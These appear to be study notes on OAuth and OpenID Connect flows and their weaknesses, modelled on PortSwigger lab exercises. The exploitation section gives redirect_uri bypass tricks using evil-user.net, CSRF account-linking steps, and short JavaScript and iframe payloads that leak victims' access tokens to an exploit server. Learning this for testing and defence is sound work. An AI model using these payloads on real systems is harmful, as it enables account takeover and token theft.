# OAuth

### what is OAuth

* while browsing you certainly come across site that let you login in using your social media account or google account this feature is knows as Oauth.
* since this is more common and inherently prone to implementation mistakenly. and many vulnerability present in that feature.

* OAuth is commonly used authorization framework that enables website and web applications to request limited access to user's account on another application.

### how OAuth Works
It works by Defining a Series of Interaction Between three Distinct parties.
* **Client Application:** The web site or application want to access user data.
*  **Resource Owner:** The user whose data client application want to access.
*   **OAuth Service Provider:** The website or Application that controls the user's data and give access to it. They support OAuth by providing an API for interacting with both an Authorization server and  a Resource server.


# OAuth Grant Types

#### it is Grant type or Flows that state process of giving access to users data to requested application.

### What is OAuth Grant Type
* it determines exact sequence of steps involved in the OAuth process.
* it affects how client application communicate with OAuth service at each stage.

### OAuth Scopes
* it what kind of data client application want and what operation it want to perform on it.
* it varies for different OAuth service 
Example:
```js
scope=contacts  
scope=contacts.read  
scope=contact-list-r  
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

They also Use  the scope **OpenID Profile** this grant client application read access to  predefined set of basic Information about the user.

### Grant Types 
1. **Authorization code grant type. :** This is more secure because once server got access code, the server-to-server communication established to secure-channel and client have not access to these request so no one can manipulate that server-to-server request.
2. **Implicit grant type :**  The implicit grant Type is much simpler. Rather than first obtaining an authorization code and then exchanging it for an access token, the client application receives the access token immediately after the user gives their consent. and `also it is less secure because the callback is going from the client browser rather than server-to-server by secure channel. `.

# Authorization Code Grant Type
## Process of authorization
### 1. Authorization Request
* Client sends a request to the OAuth Service's /Authorization end point asking for permission to access specific user data. 
* The end point may be vary between different authorization service but request look like this 
```js
GET /authorization?client_id=12345&redirect_uri=https://client-
app.com/callback&response_type=code&scope=openid%20profile&state=
ae13d489bd00e3c24 HTTP/1.1  
Host: oauth-authorization-server.com
```

**Request Contains Following Parameters**
* **client_id:** mandatory parameter containing the unique identifier of the client application. this value is generated when the client application registers with the OAuth service.
* **Redirect_uri:** /callback URI  uri at which users browser redirect when sending the authorization code to the client application.
* **response_type :** Determine s which kind of response the client application is expecting and therefor, which flow it wants to initiate for the authorization  code grant type, the value should be `code`.
* **scope :** used to specify which subset of the user's data the client application want to access.`Note this may be custom Or they use OpenId Connect specification`.
* **state :** stores a unique, unguessable value or we can say `CSRF Token`

	### 2. User login and Consent
	
	* when Authorization server receives the initial request, it will redirect user to login page, where they will be prompted to login to their account with the OAuth provider.
	* once the user approved and login using this, when user revisit the web apps they do not need to re enter their creds for OAuth service they simply one click and they able to loged in to their account.
	
	### 3. Authorization Code Grant
	* if the user consent the requested access, their browser redirected to `/callback` endpoint.
	* The resulting **GET** request contain the authorization code as Query parameter.
```js
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

### 4. Access Token Request
* Once the client application receives the authorization code. it needs to exchange it for access token. 
* To do this it sends server-to-server POST Request to OAuth service's /token endpoint.
* all communication from this take place on secure back-end channel so usually that is not controlled by an anyone.
 ```js
POST /token HTTP/1.1  
Host: oauth-authorization-server.com  
…  
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

### 5. Access Token Grant
* The OAuth service will validate the access token request. 
* if every thing is as expected server response by granting the client application as access token with the request scope.

```js
{  
  "access_token": "z0y9x8w7v6u5",  
  "token_type": "Bearer",  
  "expires_in": 3600,  
  "scope": "openid profile",  
  …  
}
```

### 6. API call
* Now the client application has the access code, it can finally fetch user's data from the resource server.
* To Do this it makes an API call to the OAuth service's `/userinfo` endpoint
`NOTE: endpoint may vary for different OAuth service provider`

The access token is submitted in the `Authorization: Bearer` header to prove that the client application has permission to access this data.

```bash
GET /userinfo HTTP/1.1  
Host: oauth-resource-server.com  
Authorization: Bearer z0y9x8w7v6u5
```

### 7.Resource Grant
* the resource server should verify that the token is valid and that it belongs to the current client application. 
* they responses with sending requested info.	
```JS
{"username":"carlos",  
  "email":"carlos@carlos-montoya.net"
}
```


# Implicit Grant Type
* The implicit grant type is much simpler. Rather than first obtaining an authorization code and then exchanging it for an access token, the client application receives the access token immediately after the user gives their consent.
* it is less secure because all the communication happen via Browser Redirects, There is no Secure back channel like `Authorization code flow ` have.
* this means sensitive access token and user's data are more exposed to potential attack.

### 1. Authorization Request
* The implicit Flow starts in much same way as Authorization code flow the only difference is **'response_type' parameter set to 'token'**.
```js
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1  
Host: oauth-authorization-server.com
```

### 2. User login and consent
* the user logs in and decide weather to consent the application or not.

### 3. Access Token Grant
* The OAuth service will redirect the user's browser to `redirect_uri`
* instead of sending query parameter containing authorization code, it will send access token and other token-specific data.
```js
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1  
Host: client-app.com
```
access token is sent in a URL fragment which is less secure.instead use any script to extract the fragment and store it.

### 4. API call 
* after access token granted application make api call to request user's data unlike authorization code this communication happens via Browser which is not best practice.
```js
GET /userinfo HTTP/1.1  
Host: oauth-resource-server.com  
Authorization: Bearer z0y9x8w7v6u5
```

### 5.Resource Grant
server verify the token and send response contain requested resource.

```js
{  
  "username":"carlos",  
  "email":"carlos@carlos-montoya.net"  
}
```

now application use it  as an ID to grant the user an authenticated session. effectively logging them in.


# Vulnerability in OAuth
## How do OAuth vulnerability arises
* OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design.
* there's plenty of opportunity for bad practice to creep in.
* lack of built-in security features.
* Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.

### Identifying OAuth Authentication 
* If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.
* another is proxying your traffic through burp and check corresponding HTTP messages when trying login.
* keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters
* Example:
```js
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1  
Host: oauth-authorization-server.com
```

### Recon
* external OAuth service is used, you should be able to identify the specific provider from the `hostname` to which the authorization request is sent. As these services provide a `public API`, there is often detailed documentation available that should tell you all kinds of useful information, such as the `exact names of the endpoints` and which configuration options are being used.
* once we know hostname of the Authorization server try to send GET Request to 
```js
GET /.well-known/oauth-authorization-server(the authorization server is used by application)

GET /.well-known/openi-configuration 
```
These will return JSON Configuration file containing Key information such as `details of additional features that may supported` this gives up wider attack surface and supported feature that may not be mentioned in the documentation


# Exploiting OAuth Authentication vulnerabilities
* vulnerability can arise in the client application's implementation of OAuth and configuration of the OAuth service it self.

## vulnerabilities in the OAuth Client Application

### **improper implementation of the implicit grant type.**
* in this flow the access token is sent from OAuth service to the client application via the user's browser as url fragment.
* The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data somewhere in the server.
* To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie.
* ```To exploit attacker simply change the parameter send to server for storage and login as victim ```.

### Flawed CSRF Protection
* the state parameter ideally contains unguessable  value , such as hash or something tied to the user's session.
* this value is then passed back and forth between the client application and OAuth service as a form of `CSRF Token` for the client application.
* consider a application that allows users to log in using classic password-based login or by linking their social-media account using OAuth. in this case if the application fail to use `state` parameter, an attacker could potentially hijack a victim's user account.
* In This type of attack we directly login with social media account and forward request until we got `oauth?code=(code)` copy that code and drop the request so we have unused code and we craft `csrf payload that make request to domain.com/oauth-linking?code=(code we generated thorugh our social media account ` and when victim go to our sended link he attach his account with our social media account due to `missing of state ` parameter which prevents CSRF. and we can easily login to their account.

### Leaking Authorization codes and access Token
* Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`
* see all request and analyze authorization request.
* see if this contain `redirect_uri` parameter which redirect the user with authorization code.
* we craft `CSRF PAYLOAD` and send it to victim and if victim have active session he redirect to our exploit server with `authorization code` and we can replace it with our and we have full control of victim account.

### Flawed redirect_uri validation
* best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service.
* so it can validate the `redirect_uri` parameter against this whitelist and if not in whitelist it can give error.
#### but this can be bypassed
* Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
* You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:  
```js
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
* Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.
* we need to experiment with other parameters to change it, it may affect other parameter's validation eg. changing `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri` and we bypass blocking.

### Stealing Codes and Access Token via a Proxy Page
* Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`.
* try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.
* Try to find ways that you can successfully access different subdomains or paths or use `Directory traversal ` tricks to supply any arbitrary path on the domain.
```js
https://client-app.com/oauth/callback/../../example/path
```
* once we have identified which other pages are able to set as `redirect URI` we audit them for additional vulnerabilities that you can leak the code.
* For the `authorization code flow`, you need to find a vulnerability that gives you access to the query parameters.
* for the `implicit grant type`, you need to extract the URL fragment.
* one of the most usefull vulnerability for this purpose is an `Open Redirect`, we can use this as proxy to forward victims along with their code to attacker controlled domain.

`NOTE that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.`

### Stealing OAuth Token via an open Redirect.
* see the authorization request's `redirect_uri` parameter we cant change it to exploit server but we can check `Directory traversal vuln` and check `/../`
* this is vulnerable to directory traversal
* and we find any web request that point to another url or directory 
* `/post/next?path=(here we put our exploit server uri)` and it redirects us to exploit server with OAuth Token.
* we make an script that execute so we get their token in the access log of our server
```js
<script>
window.location='/?'+document.location.hash.substr(1)
</script>
```
* some application make another request with authorization header to retrieve the information so we attach victim authorization code with this request and we got victims info including API keys.

### Stealing OAuth access token via a Proxy page
* since we dint able to make redirect_uri to make external call
* we analyse the application and find any other vulnerability we can take advantage of that.
* here we have vulnerable in comment section that  `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
* final csrf link is 
```js
<iframe src="https://YOUR-LAB-AUTH-SERVER/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
```
`<script>  
  window.addEventListener('message', function(e) {  
    fetch("/" + encodeURIComponent(e.data.data))  
  }, false)  
</script` this script listen web message in the exploit server and revel the message.

# Flowed Scope Validation
* In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.

### Scope Upgrade: 
* their is chance to manipulate the scope
* also unverified user registration that doesn't verify the user who register so attacker can register with the same detail that victim have and may able to login in as victim.


# OpenId Connect

### what is OpenId connect 
* OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the `basic OAuth implementation` It adds some simple functionality that enables better support for the authentication use case of OAuth.
### OpenId Connet Roles
* Relying Party: The application that is requesting authentication of user. same as OAuth client application.
* End user: The user who is being authenticated. same as OAuth resource owner.
* OpenId Provider: an Oauth service that is configured to support OpenId Connect.
### OpenId Connect Claims and Scopes
"claims" refer to `key:value` pairs that represent information about user on the resource server.
`name:"DK"`
* scope of OpenId connect are fixed and they include 1 or more other standard scopes.

### ID Token
`id_token` Response type.
* this return `JSON Web Token(JWT)` signed with `JSON web signature(JWS)`
* The main benefit of using `id_token` is the reduced number of requests that need to be sent between the client application and the OAuth service, which could provide better performance overall. Instead of having to get an access token and then request the user data separately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves.
* ID token is based on Cryptographic signature. so protection against MITM but keys for verification transmit on the same channel.(Normally exposed on ``/.well-known/jwks.json``)
*  Note that multiple response types are supported by OAuth, so it's perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's `id_token` response type:
`response_type=id_token token  
response_type=id_token code`.

### Identifying OpenId Connect
* check authorization request contain `openid` scope.
* even if the application doesn't seem try to enter `openid` in Scope or change the response type to `id_token`.
* check `/.well-known/openid-configuration`

### openid connect vulnerabilities
there is very less chance that vulnerabilities occur in this filed

### Unprotected Dynamic client Registration

for more details visit here 
[ssrf via openid dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

## prevention
[how to prevent O-Auth vulnerability by portSwigger](https://portswigger.net/web-security/oauth/preventing)